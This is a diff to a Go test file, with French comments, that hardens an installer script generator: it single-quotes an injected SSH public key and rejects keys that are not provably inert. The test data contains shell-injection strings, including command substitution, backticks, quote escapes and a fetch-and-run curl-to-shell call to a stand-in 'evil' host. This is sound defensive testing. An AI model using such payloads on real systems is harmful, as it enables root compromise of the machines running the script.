@@ -42,12 +42,17 @@ func TestBuildInstallerScript_EmbedsHelperVerbatimWithMatchingSHA(t *testing.T) 
 
 // TestBuildInstallerScript_PubkeyInjectedAndForcedCommand verifies the authorized_keys
 // line is built with the forced-command + restrictions and the CURRENT public key.
+// La clé est posée entre guillemets SIMPLES : le script tourne en root sur
+// l'hyperviseur du client, aucune expansion ne doit pouvoir s'y produire.
 func TestBuildInstallerScript_PubkeyInjectedAndForcedCommand(t *testing.T) {
 	const pub = "ssh-ed25519 AAAAExampleKeyDataHere comment"
 	script := buildInstallerScript(pub, "host:8443")
 
-	if !strings.Contains(script, `readonly PUBKEY="`+pub+`"`) {
-		t.Error("public key not injected verbatim into PUBKEY")
+	if !strings.Contains(script, `readonly PUBKEY='`+pub+`'`) {
+		t.Error("public key not injected verbatim into PUBKEY (single-quoted)")
+	}
+	if strings.Contains(script, `readonly PUBKEY="`) {
+		t.Error("PUBKEY is still double-quoted — shell expansion would apply to it")
 	}
 	// The forced-command + no-pty restrictions must be present in the authorized_keys
 	// assembly (without them the channel would not be locked to the read-only helper).
@@ -72,8 +77,58 @@ func TestBuildInstallerScript_CollapsesMultilinePubkey(t *testing.T) {
 	if strings.Contains(script, "AAAAattacker") {
 		t.Error("multiline pubkey leaked a second key line into the installer (injection)")
 	}
-	if !strings.Contains(script, `readonly PUBKEY="ssh-ed25519 AAAAlegit comment"`) {
+	if !strings.Contains(script, `readonly PUBKEY='ssh-ed25519 AAAAlegit comment'`) {
 		t.Error("the legitimate first pubkey line was not preserved")
+	}
+}
+
+// TestValidateChannelPubkey : la clé finit interpolée dans un script exécuté en ROOT
+// sur l'hyperviseur du client. Tout ce qui n'est pas une ligne authorized_keys
+// prouvablement inerte est refusé — jamais échappé « au mieux ».
+func TestValidateChannelPubkey(t *testing.T) {
+	valid := []string{
+		"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleKeyDataHere goabackup-channel@goacloud",
+		"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExample==",
+		"ssh-rsa AAAAB3NzaC1yc2E comment_1-2.3",
+	}
+	for _, k := range valid {
+		if _, err := validateChannelPubkey(k); err != nil {
+			t.Errorf("clé légitime refusée %q : %v", k, err)
+		}
+	}
+
+	invalid := map[string]string{
+		"vide":                    "",
+		"espaces seuls":           "   ",
+		"type inconnu":            "ssh-magic AAAAB3NzaC1yc2E",
+		"substitution de comm.":   "ssh-ed25519 AAAAB3Nza $(id > /tmp/pwn)",
+		"backticks":               "ssh-ed25519 AAAAB3Nza `id`",
+		"guillemet simple":        "ssh-ed25519 AAAAB3Nza x'; id; echo '",
+		"point-virgule":           "ssh-ed25519 AAAAB3Nza;id",
+		"base64 avec espace":      "ssh-ed25519 AAAA BBBB CCCC DDDD",
+		"caractère hors base64":   "ssh-ed25519 AAAA$BBB",
+		"pas de partie base64":    "ssh-ed25519",
+		"variable dans commentai": "ssh-ed25519 AAAAB3Nza ${HOME}",
+	}
+	for name, k := range invalid {
+		if _, err := validateChannelPubkey(k); err == nil {
+			t.Errorf("%s : la clé %q aurait dû être refusée", name, k)
+		}
+	}
+}
+
+// TestBuildInstallerScript_RefusesUnsafePubkey : une clé qui ne valide pas ne doit
+// JAMAIS produire un installateur — le script servi refuse et explique.
+func TestBuildInstallerScript_RefusesUnsafePubkey(t *testing.T) {
+	script := buildInstallerScript("ssh-ed25519 AAAA$(curl http://evil/x|sh)", "host:8443")
+
+	for _, forbidden := range []string{"useradd", "sudoers", "authorized_keys", "curl", "evil"} {
+		if strings.Contains(script, forbidden) {
+			t.Errorf("le script de refus ne doit rien installer ni recopier l'entrée (%q présent)", forbidden)
+		}
+	}
+	if !strings.Contains(script, "exit 1") {
+		t.Error("le script de refus doit sortir en erreur")
 	}
 }
 
